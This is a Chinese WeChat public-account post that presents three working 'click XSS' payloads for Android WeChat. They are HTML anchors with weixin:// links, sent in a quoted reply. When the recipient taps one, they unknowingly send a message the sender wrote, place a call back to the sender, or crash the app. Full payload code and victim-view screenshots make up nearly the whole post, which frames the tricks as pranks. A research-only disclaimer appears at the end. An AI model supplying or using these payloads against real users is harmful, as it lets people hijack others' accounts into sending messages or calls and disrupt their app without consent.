> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4MTkwMTI5Mw==&mid=2247490188&idx=1&sn=237e8b92f0b91d5b45fca4a8108b0dcc

#  逆大天，微信点击XSS，弹电话发信息  
原创 Mstir  星悦安全   2025-07-13 15:13  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x01 微信点击XSS  
  
该玩法仅限安卓微信，苹果会直接显示源代码，具体操作就是引用随便一个人的话，然后发送代码，对面点击就会调用微信协议做出对应操作.  
  
  
玩法1：让对方发 我们想让他发的话 (一定要引用):  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cjAU3wqgsYNO3jWcwS4u5yYhMrlfZMwMr7xG5M9iciauRv6gCyeEQ9ctiaKwV6CH0icM0togia7FySJhA/640?wx_fmt=png&from=appmsg "")  
  
对方视角:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cjAU3wqgsYNO3jWcwS4u5yjIXuFhqEe3AhnQibLibqESzdYgMdLpexwVuVXYps9rYaKRgqpNk1sxBw/640?wx_fmt=png&from=appmsg "")  
  
完整代码:  

```
<a href=&#34;weixin://bizmsgmenu
?msgmenucontent=爸爸，我错了以后再也不乱点了
&msgmenuid=960&#34;>http://www.bilibili.com/bv183613</a>
上海漫展吃瓜
```

  
玩法2：让对方直接给你扣电话 (  
需有好友位  
):  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cjAU3wqgsYNO3jWcwS4u5yFnI8Z4ehk2mZf37eRc2qdVwM7bHWHM5eQiazOXt7K5MO8lC6pZDZY8w/640?wx_fmt=png&from=appmsg "")  
  
对面视角:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cjAU3wqgsYNO3jWcwS4u5ytKtVelOmIfPGFU9NIRPEdVbvHe3m12X7T8icxtdVQ7feGpZianQ8FpWw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cjAU3wqgsYNO3jWcwS4u5yRnPHgibYb2IoT4Zxibv4bmX9qvYZm4JRjKKOKehxQibEYBmnFWTsKZM4A/640?wx_fmt=png&from=appmsg "")  
  
完整代码:  

```
<a href=&#34;weixin://voip/callagain/?username=微信号&#34;>试试这个</a>
```

  
玩法3：直接让对方闪退:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cjAU3wqgsYNO3jWcwS4u5yS2iaPA8ktcQwFETsjEeRibibHD1VkCibIqzpIPOmRD71d3mEVbjRgZT7pQ/640?wx_fmt=png&from=appmsg "")  
  
对方视角:  
  
  
完整代码:  

```
<a href=&#34;weixin://jump/voipdetail/?data=1&#34;>ok了家人们</a>
```

## 0x02 关注公众号  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**关注公众号，获取最新安全文章!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
